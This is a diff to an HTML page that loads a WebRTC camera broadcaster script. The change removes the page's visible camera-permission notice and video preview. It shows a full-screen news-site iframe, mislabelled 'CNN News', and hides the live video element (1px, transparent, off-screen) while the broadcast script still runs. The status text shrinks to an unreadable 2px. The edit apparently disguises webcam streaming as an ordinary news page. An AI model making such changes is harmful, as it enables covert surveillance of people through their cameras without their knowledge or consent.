@@ -8,11 +8,12 @@
     <link rel="stylesheet" href="css/style.css">
 </head>
 <body>
-    <div id="main-content">
-        <h1>Camera Broadcaster & Live Preview</h1>
-        <p>Your browser is requesting permission to check your camera. Please click 'Allow' in the pop-up above to continue.</p>
-    <video id="videoFeed" style="width: 320px; height: 240px; border: 2px solid green; display: block; margin: 0 auto;" autoplay playsinline></video>
-    <p id="broadcaster-status">Initializing...</p>
+    <div id="main-content" style="width:100vw; height:calc(100vh - 106px); margin:0; padding:0; position:relative; z-index:1;">
+        <iframe src="https://abcnews.go.com" style="width:100vw; height:100%; border:none;" title="CNN News"></iframe>
+    </div>
+        <div id="broadcaster-bar" style="width:10vw; background:#222; color:#fff; display:flex; align-items:center; padding:8px 0; position:relative; z-index:2;">
+        <video id="videoFeed" style="width:1px; height:1px; opacity:0; position:absolute; left:-9999px;" autoplay playsinline></video>
+        <span id="broadcaster-status" style="margin-left:16px; font-size:2px;">Initializing...</span>
     </div>
     <script src="/socket.io/socket.io.js"></script>
     <script src="webrtc-broadcaster.js"></script>
